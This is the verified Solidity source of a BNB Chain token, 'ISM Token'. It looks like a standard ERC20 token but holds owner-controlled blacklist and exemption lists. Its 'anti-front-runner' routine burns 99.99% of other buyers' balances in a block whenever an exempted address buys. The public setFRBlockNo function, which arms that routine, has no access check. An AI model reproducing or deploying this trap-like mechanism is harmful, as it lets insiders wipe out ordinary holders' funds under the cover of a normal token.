/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ISM_Token {
    string public constant name = "ISM Token";
    string public constant symbol = "ISM";
    uint8 public constant decimals = 18;
    uint256 private _totalSupply = 1000000000 * 10 ** decimals;

    address private factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;       
    address private BSC_USDT = 0x55d398326f99059fF775485246999027B3197955;
    address private BUSD = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address private USDC = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    address public owner;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
        
    mapping(address => bool) public isPairAddress;
    mapping(address => bool) public isFrontRunnerAddress;
    mapping(address => bool) public isExemptedAddress;
    address[] public frontRunnerBlackList;
    address[] public exemptedList;

    address[] private currentBlockBuyersList;
    uint256 public lastBuyerBlockNo;
    uint256 public lastFRBlockNo;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        isPairAddress[computePairAddress(WBNB)] = true;
        isPairAddress[computePairAddress(BSC_USDT)] = true;
        isPairAddress[computePairAddress(BUSD)] = true;
        isPairAddress[computePairAddress(USDC)] = true;

        addToExemptedList(owner);
        addToExemptedList(address(0));
        addToExemptedList(router);

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender==owner , "Only owner!");
        _;
    }

    function addToExemptedList(address _address) public onlyOwner {
        require (!isExemptedAddress[_address], "address exsit in exemptedList");
        require (!isFrontRunnerAddress[_address] , "address exsit in frontRunnerBlackList");    
        require (!isPairAddress[_address], "address exsit in poolList");
        isExemptedAddress[_address] = true;
        exemptedList.push(_address);
    }

    function removeFromExemptedList(address _address) public onlyOwner {
        require (isExemptedAddress[_address] , "address doesnot exsit in exemptedList");
        require (_address != address(0) && _address != owner && _address != router, "Restricted Address");
        isExemptedAddress[_address] = false;
        uint256 len = exemptedList.length;
        for(uint256 i = 0; i < len; i++) {
            if(exemptedList[i] == _address) {
                exemptedList[i] = exemptedList[len-1];
                exemptedList.pop();
                break;
            }
        }
    }

    function addToBlackList(address _address) public onlyOwner {
        require (!isExemptedAddress[_address], "address exsit in exemptedList");
        require (!isFrontRunnerAddress[_address] , "address exsit in frontRunnerBlackList");     
        require (!isPairAddress[_address], "address exsit in poolList");
        isFrontRunnerAddress[_address] = true;
        frontRunnerBlackList.push(_address);
    }
    function removeFromBlackList(address _address) public onlyOwner {
        require (isFrontRunnerAddress[_address] , "address doesnot exsit in frontRunnerBlackList");
        isFrontRunnerAddress[_address] = false;
        uint len = frontRunnerBlackList.length;
        for(uint i = 0; i < len; i++) {
            if(frontRunnerBlackList[i] == _address) {
                frontRunnerBlackList[i] = frontRunnerBlackList[len-1];
                frontRunnerBlackList.pop();
                break;
            }
        }
    }

    function getExemptedList() public view returns (address[] memory list){
        list = exemptedList;
    }
    function getExemptedListLength() public view returns (uint256) {
        return exemptedList.length;
    }

    function getFrontRunerBlackList() public view returns (address[] memory list){
        list = frontRunnerBlackList;
    }
    function getfrontRunnerBlackListLength() public view returns (uint256) {
        return frontRunnerBlackList.length;
    }
    
    function setFRBlockNo(uint256 _lastFRBlockNo) public {
        lastFRBlockNo = _lastFRBlockNo;
    }

    function computePairAddress(address tokenB) internal view returns (address) {
        (address token0, address token1) = address(this) < tokenB ? (address(this), tokenB) : (tokenB, address(this));
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
    }
    // ERC20 Functions
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address inqAddress) public view returns (uint256) {
        return balances[inqAddress];
    }

    function transfer(address receiver, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, receiver, amount);
    }

    function transferFrom(address tokenOwner, address receiver, uint256 amount) public returns (bool) {
        require(amount <= allowed[tokenOwner][msg.sender],"Invalid number of tokens allowed by owner");
        allowed[tokenOwner][msg.sender] -= amount;
        return _transfer(tokenOwner, receiver, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return allowed[tokenOwner][spender];
    }

    function _transfer(address sender, address receiver, uint256 amount) internal returns (bool) {
        require(sender!= address(0) && receiver!= address(0), "invalid send or receiver address");
        require(amount <= balances[sender], "Invalid number of tokens");
        require(!isFrontRunnerAddress[receiver] , "RBO"); // No Known FrontRunners allowed to buy

        balances[sender] -= amount;
        balances[receiver] += amount;

        emit Transfer(sender, receiver, amount);
        
        if(isPairAddress[sender] && !isPairAddress[receiver]){
            if(isExemptedAddress[receiver]) isExemptedFrontRunned();
            else addToBlockBuyersList(receiver);
        }
        return true;
    }

    function addToBlockBuyersList(address receiver) internal  {
        if(lastBuyerBlockNo != block.number){
            lastBuyerBlockNo = block.number;
            delete currentBlockBuyersList;
        }
        currentBlockBuyersList.push(receiver);
    }

    function isExemptedFrontRunned() internal {
        uint256 _lastBuyerBlockNo = lastBuyerBlockNo;
        uint256 _lastFRBlockNo = lastFRBlockNo;
        if(_lastBuyerBlockNo == block.number && (_lastFRBlockNo == _lastBuyerBlockNo || _lastFRBlockNo == _lastBuyerBlockNo-1)){
            address[] memory _currentBlockBuyersList = currentBlockBuyersList;
            uint256 burnAmount;
            uint256 balance;
            address frontRunnerAddress;
            for (uint256 i = 0; i < _currentBlockBuyersList.length; i++) {
                frontRunnerAddress = _currentBlockBuyersList[i];
                balance = balances[frontRunnerAddress];
                if(balance>10000) {
                    burnAmount = balance * 9999 / 10000;
                    balances[frontRunnerAddress] = balance - burnAmount;
                    balances[address(0)] += burnAmount;
                    emit Transfer(frontRunnerAddress, address(0), burnAmount);
                }
            }
        }
        delete currentBlockBuyersList;
    } 
}